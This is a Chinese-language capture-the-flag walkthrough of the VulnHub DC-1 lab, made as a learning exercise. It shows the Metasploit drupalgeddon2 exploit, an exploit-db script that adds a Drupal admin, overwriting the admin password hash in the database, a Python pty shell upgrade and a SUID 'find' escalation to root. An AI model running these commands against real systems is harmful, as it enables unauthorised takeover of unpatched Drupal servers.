# 环境搭建

下载DC1靶机

http://www.vulnhub.com/series/dc,199/

然后vmware打开ova文件进行搭建

打开DC靶机

![image-20211027160137882](images/1.png)

发现是需要登陆的,这里把kali和DC靶机的网络都换成桥接模式

![image-20211027160244042](images/2.png)

扫到了DC的ip(192.168.43.152)

# 渗透实战

DC靶机一共放了5个flag

先看看有哪里端口是开启的

![image-20211027160416332](images/3.png)

80端口开启了,访问一下

![image-20211027160458141](images/4.png)

用御剑扫出来了一个robots.txt

![image-20211027162052454](images/5.png)

但是没有什么有用的信息,这里安利一个插件Wappalyzer可以看到网站的一些版本信息

![image-20211027162041386](images/6.png)

看到了是Drupal的cms,网上搜一下有没有可用的漏洞,Drupal的版本是7

网上有很多这个cms的漏洞影响版本都是7.5以上的甚至8以上

也可以直接在kali上启动metasploit工具查找关于Drupal的漏洞是否有可以利用的

```
msfconsole -q	#进入msf
```

![image-20211027163515586](images/7.png)

我这里有个warning

这是由于postgresql 未进行postgresql 的初始化配置，所以报错没有这个数据库

解决方法`msfdb init`

重新进入msf就不弹warning了

![image-20211027163706916](images/8.png)

回到正题在msf中搜索drupal

![image-20211027164502686](images/9.png)

从年份比较近的先测试,这次可以用第四个

```
use exploit/unix/webapp/drupal_drupalgeddon2
```

利用`show options`显示攻击的信息以及要设置的参数

![image-20211027164750054](images/10.png)

设置rhosts，修改为自己找到的靶机的ip

`set rhost 192.168.43.152`

然后输入exploit执行

![image-20211027165130350](images/11.png)

看到`Meterpreter session 1 opened` 出现，说明已经攻击成功了，输入shell命令，进行交互。也可以直接这里执行命令

![image-20211027165156597](images/12.png)

看到了flag1.txt,读一下

![image-20211027165221500](images/13.png)

意思是让我们去找一下配置文件

![image-20211027165736806](images/14.png)

网上搜到配置文件再sites/default下的default.setting.php下

![image-20211027165921210](images/15.png)

但是我没找到什么的东西,结果他的信息在settings.php中,而不是default.settings.php中

![image-20211027170322150](images/16.png)

看到了flag2另外还收获了数据库的账户密码

```
flag2

Brute force and dictionary attacks aren't the
only ways to gain access (and you WILL need access).
What can you do with these credentials?

暴力和字典攻击不是最常见的
只有获得访问权限的方法（您将需要访问权限）。
你能用这些证书做什么？
```

获得了数据库密码，登陆数据库看看

```
mysql -u dbuser -p
```

但是并没有成功登陆

![image-20211027171733470](images/17.png)

![image-20211027172817084](images/18.png)

进入shell命令行反弹shell试试

可以直接bash一句话反弹

![image-20211027172936899](images/19.png)

反弹成功,现在进入mysql看看

但是bash反弹的shell还是进入不了mysql,看网上直接用的python弹shell,通过pty.spawn()获得交互式shell

```
python -c "import pty;pty.spawn('/bin/sh')"
```

![image-20211027173425713](images/20.png)

进入了mysql数据库

看到了tables有一个user项

![image-20211027173736942](images/21.png)

![image-20211027180403075](images/22.png)

看到了admin

但是密码是加密了的,这时候应该怎么办呢,drupal的数据库加密方式是sha-256加盐,drupal有一个默认的加密脚本

加密的脚本所在路径：/var/www/scripts/password-hash.sh

我们可以直接修改admin的密码来直接登陆admin账号

```
./scripts/password-hash.sh 123456
```

来生成数据库中密码的hash值

```
$S$DZbrEgdoriLIbeKjHKoqevlD3.TPJrrGMaJXxRlaNueV0wbYhKEo
```

然后就是修改数据库密码了

```
update users set pass='$S$DZbrEgdoriLIbeKjHKoqevlD3.TPJrrGMaJXxRlaNueV0wbYhKEo' where name='admin';
```

![image-20211027193006246](images/23.png)

登陆成功

find content中找到了flag3

![image-20211027193114661](images/24.png)

除此之外,还有没有可能去给数据增加一个admin权限的用户,毕竟管理员可以不止一个

```
cat includes/bootstrap.inc | grep VERSION  #查看靶机版本
```

![image-20211027193600586](images/25.png)

版本是7.24,看看有哪里可以用的脚本

```
searchsploit drupal
```

![image-20211027200511756](images/26.png)

看到当版本小于7.31的时候可以有添加admin user的脚本

```
python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.43.152 -u admin1 -p 123456
```

![image-20211027201146872](images/27.png)

看到admin1已经添加成功

![image-20211027200959973](images/28.png)

利用admin1登陆,和admin账户是一样的

![image-20211027201247398](images/29.png)

拿到flag3

![image-20211027201317242](images/30.png)

根据几个关键词，perms,find,exec,shadow

![image-20211027201647707](images/31.png)

然而shadow只对于root用户可读,根据perm,find,exec那应该是要提权了

```
find / -perm -u=s 2>/dev/null
```

果然find具有SUID权限

![image-20211027202036429](images/32.png)

那就利用find进行SUID提权

```
find / -exec '/bin/sh' \;
```

![image-20211027202225047](images/33.png)

```
/etc/passwd保存着每个用户账号。该文件只有管理员可以修改，但是对于所有的用户都可读

/etc/shadow保存着密码等信息。该文件只有系统管理员能够修改和查看，其他用户不能查看、修改。
```

我也不知道为什么非要去读/etc/shadow来看到一串编码的东西

![image-20211027202609350](images/34.png)

明明不用提权就可以在/etc/passwd下看到flag4在/home/flag目录下

![image-20211027202635781](images/35.png)

直接

![image-20211027202745342](images/36.png)

提示还有个flag在root目录下,我个人觉得应该是这里去提权吧,flag4不需要提权就能获取

![image-20211027202853680](images/37.png)

到这里这次的靶机渗透就完成了



# 后记

第一次做渗透,主要学习的还是一个思路,webshell很重要,要先找到口子才能一步一步地拿下服务器

drupal这个cms也是metasploit工具里面有的,但是对于大多数cms来说,还是需要手撕地





参考链接

https://zhuanlan.zhihu.com/p/135342104

https://blog.csdn.net/prettyX/article/details/103267130